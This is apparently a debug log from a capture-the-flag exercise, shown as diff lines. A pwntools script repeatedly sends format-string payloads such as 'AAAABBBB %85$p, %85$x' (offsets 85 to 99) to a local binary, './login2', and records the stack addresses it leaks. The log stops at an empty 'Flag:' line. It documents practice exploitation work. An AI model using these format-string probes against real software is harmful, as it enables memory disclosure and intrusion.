+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %85$p, %85$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996148)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xf7f6ba60, f7f6ba60\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+85 : b"AAAABBBB 0xf7f6ba60, f7f6ba60\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996149
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %86$p, %86$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996149)
+[DEBUG] Received 0x53 bytes:
+    b'AAAABBBB 0x1, 1\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 83B
+[+] Receiving all data: Done (83B)
+86 : b"AAAABBBB 0x1, 1\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996150
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %87$p, %87$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996150)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffbdaacc, ffbdaacc\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+87 : b"AAAABBBB 0xffbdaacc, ffbdaacc\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996151
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %88$p, %88$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996151)
+[DEBUG] Received 0x55 bytes:
+    b'AAAABBBB (nil), 0\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 85B
+[+] Receiving all data: Done (85B)
+88 : b"AAAABBBB (nil), 0\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996152
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %89$p, %89$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996152)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffad5ad5, ffad5ad5\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+89 : b"AAAABBBB 0xffad5ad5, ffad5ad5\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996153
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %90$p, %90$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996153)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffca6aea, ffca6aea\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+90 : b"AAAABBBB 0xffca6aea, ffca6aea\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996154
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %91$p, %91$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996154)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffd0db08, ffd0db08\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+91 : b"AAAABBBB 0xffd0db08, ffd0db08\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996155
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %92$p, %92$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996155)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffdf8b1d, ffdf8b1d\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+92 : b"AAAABBBB 0xffdf8b1d, ffdf8b1d\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996156
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %93$p, %93$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996156)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xfff15b28, fff15b28\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+93 : b"AAAABBBB 0xfff15b28, fff15b28\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996157
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %94$p, %94$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996157)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffab9b3d, ffab9b3d\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+94 : b"AAAABBBB 0xffab9b3d, ffab9b3d\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996158
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %95$p, %95$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996158)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffce0b4c, ffce0b4c\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+95 : b"AAAABBBB 0xffce0b4c, ffce0b4c\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996159
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %96$p, %96$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996159)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xff995b6a, ff995b6a\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+96 : b"AAAABBBB 0xff995b6a, ff995b6a\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996160
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %97$p, %97$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996160)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffdd6b7f, ffdd6b7f\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+97 : b"AAAABBBB 0xffdd6b7f, ffdd6b7f\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996161
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %98$p, %98$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996161)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffe6db92, ffe6db92\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+98 : b"AAAABBBB 0xffe6db92, ffe6db92\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+[x] Starting local process './login2'
+[+] Starting local process './login2': pid 996162
+[DEBUG] Received 0x1d bytes:
+    b'What is the secret password?\n'
+[DEBUG] Sent 0x16 bytes:
+    b'AAAABBBB %99$p, %99$x\n'
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './login2' stopped with exit code 0 (pid 996162)
+[DEBUG] Received 0x61 bytes:
+    b'AAAABBBB 0xffefdb9a, ffefdb9a\n'
+    b"... hmm that doesn't seem right\n"
+    b'Login failed, try again next time!\n'
+[x] Receiving all data: 97B
+[+] Receiving all data: Done (97B)
+99 : b"AAAABBBB 0xffefdb9a, ffefdb9a\n... hmm that doesn't seem right\nLogin failed, try again next time!\n"
+--------------------------------------------------
+
+Flag: 
